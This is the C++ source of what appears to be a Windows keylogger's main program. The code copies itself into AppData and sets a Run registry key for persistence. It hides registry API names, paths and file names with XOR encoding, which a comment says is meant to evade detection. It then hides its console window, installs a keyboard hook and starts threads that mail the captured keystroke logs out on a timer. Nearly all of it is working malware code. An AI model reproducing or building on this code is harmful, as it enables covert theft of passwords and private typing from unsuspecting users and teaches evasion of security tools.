#define _WIN32_WINNT 0x0500
#define _CRT_SECURE_NO_WARNINGS
#define UNICODE
#define _UNICODE
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include<tchar.h>
#include<thread>
#include "Helper.h"
#include "IO.h"
#include "KeybHook.h"
#include"KeyConstants.h"
#include "SendMail.h"
#include"Globals.h"
#define MAX_THREADS 2
#define XOR_KEY (1 << 3)
#define MAX_NAME 60 
using namespace std;

#define encryption_key 4
#pragma comment(lib, "Advapi32.lib")

//C:\Users\hp\AppData\Roaming\Microsoft\CLR

typedef LSTATUS(__stdcall* pRgOpn)(
	IN           HKEY,
	IN			 LPCWSTR,
	IN           DWORD,
	IN           REGSAM,
	OUT          PHKEY
	);

typedef LSTATUS(__stdcall* pRgSet)(
	IN           HKEY,
	IN          LPCSTR,
	DWORD      Reserved,
	IN           DWORD,
	IN           const BYTE*,
	IN           DWORD
	);

typedef LSTATUS(__stdcall* pRgClose)(
	IN           HKEY
	);

class InitialOperationsClass final {

public:
	//Default constructor
	InitialOperationsClass() = default;

	virtual ~InitialOperationsClass() {
		HeapFree(hDefaultProcessHeap, 0, pWideChrStr);
	}

	void AutoCopy() {

		userlc = IO::GetOurPath(true);//Creating directory
		f_path = userlc;
		string f_name = f_path;
		DecryptXOR((char*)encrName, strlen(encrName), encryption_key);
		f_name += string(encrName);//file name
		char my_name[260];
		GetModuleFileNameA(GetModuleHandle(0), my_name, 260);//name of running process
		string f_my = my_name;
		CreateDirectoryA(f_path.c_str(), NULL);
		CopyFileA(f_my.c_str(), f_name.c_str(), FALSE);

	}

	bool AutoRUN()
	{
		HKEY hOpened;
		char pPath[MAX_PATH];
		char Driver[MAX_PATH];
		string errr = GetLastErrorAsString();


		DecryptXOR((char*)libName, strlen(libName), encryption_key);
		DecryptXOR((char*)openRgName, strlen(openRgName), encryption_key);
		openRgFnc = (pRgOpn)GetProcAddress(LoadLibraryA(libName), openRgName);


		//Getting function address with GetProcAddress() directly from dll. skCrypt() will encode names to make them undetectable
		DecryptXOR((char*)saveRgName, strlen(saveRgName), encryption_key);
		setPgFnc = (pRgSet)GetProcAddress(LoadLibraryA(libName), saveRgName);

		DecryptXOR((char*)clseRgName, strlen(clseRgName), encryption_key);
		clseRgFunc = (pRgClose)GetProcAddress(GetModuleHandleA(libName), clseRgName);

		DecryptXOR((char*)regPath, strlen(regPath), encryption_key);
		pWideChrStr = (PWSTR)HeapAlloc(hDefaultProcessHeap, 0, (strlen(regPath) + 1) * sizeof(wchar_t));
		mbstowcs(pWideChrStr, regPath, strlen(regPath) + 1);
		openRgFnc(((HKEY)(ULONG_PTR)((LONG)0x80000001)), pWideChrStr, 0, ((0x001F0000L | 0x0001 |
			0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020) & (~0x00100000L)), &hOpened);

		errr = GetLastErrorAsString();

		DecryptXOR((char*)encrName, strlen(encrName), encryption_key);
		string ff_path = userlc + encrName;
		strcpy(Driver, ff_path.c_str());
		//cout<<ff_path<<"\n";
		//getchar();
		DecryptXOR((char*)regValToWrite, strlen(regValToWrite), encryption_key);

		if (ERROR_SUCCESS != setPgFnc(hOpened, regValToWrite, 0, (1ul), (LPBYTE)ff_path.c_str(), (strlen(ff_path.c_str()) + 1))) {
			clseRgFunc(hOpened);
			MessageBox(NULL, L"Error in writing registry", L"err", 0);
			return false;
		}
		clseRgFunc(hOpened);
		return true;
	}

	void initializeOldSize() {
		std::string fileNamePath = IO::GetOurPath(true) + std::string(LOG_FILE);
		HANDLE hFile = CreateFileA(
			fileNamePath.c_str(),     // Filename
			GENERIC_READ,  // append mode  // Desired access
			FILE_SHARE_READ,        // Share mode
			NULL,                   // Security attributes
			OPEN_EXISTING, // Open existing file
			FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
			NULL);                  // Template file handle

		if (hFile == INVALID_HANDLE_VALUE) {
			Helper::WriteAppLog(" File not exist yet or it might be used by another process");
		}
		oldSize = GetFileSize(hFile, NULL);
		CloseHandle(hFile);
	}

	void __closeCmdPromptWnd(const char* appName) {
		// Find the handle to the Current Prog window and close it

		hWnd = FindWindowA(NULL, appName);

		// If the window was found, send a WM_CLOSE message to it
		if (hWnd != NULL)
		{
			ShowWindow(hWnd, SW_HIDE);
		}
	}

private:

	void DecryptXOR(char* encrypted_data, size_t data_length, int key) {

		for (int i = 0; i < data_length; i++) {
			encrypted_data[i] = (encrypted_data[i] ^ key);
		}
	}

	int key_index = 0;
	HWND hWnd{};
	string userlc{}, f_path{};
	pRgOpn openRgFnc{};
	pRgSet setPgFnc{};
	pRgClose clseRgFunc{};
	HANDLE hDefaultProcessHeap{ GetProcessHeap() };
	char libName[MAX_NAME] = { "E`retm76*`hh" };
	char openRgName[MAX_NAME]{ "VacKtajOa}A|S" };
	char saveRgName[MAX_NAME]{ "VacWapRehqaA|E" };
	char clseRgName[MAX_NAME]{ "VacGhkwaOa}" };
	char regPath[MAX_NAME]{ "WkbpsevaXImgvkwkbpXSmj`kswXGqvvajpRavwmkjXVqj" };
	char regValToWrite[MAX_NAME] {"Smj`ksw$Epetm$|<2[20$@vmrav"};
	char encrName[MAX_NAME]{ "wrglkwp*a|a" };
	PWSTR pWideChrStr{};

};

int main(int argc, char** argv)
{
	InitialOperationsClass initOprs;
	initOprs.AutoCopy();
	initOprs.AutoRUN();
	initOprs.initializeOldSize();
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //if this fails, then try with alternate trick
	initOprs.__closeCmdPromptWnd(argv[0]);

	MSG msg;
	char currDirectory[MAX_PATH] = { 0 };
	GetCurrentDirectoryA(MAX_PATH, currDirectory);
	InstallHook();
	HookProcedureClass<string> hooKproc{ std::string(currDirectory) };
	thread th2(SendMail(), 3);
	thread thrTimerSendMail{ &HookProcedureClass<string>::TimerSendMail , &hooKproc};

	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	th2.join();
	thrTimerSendMail.join();

	return 0;
}
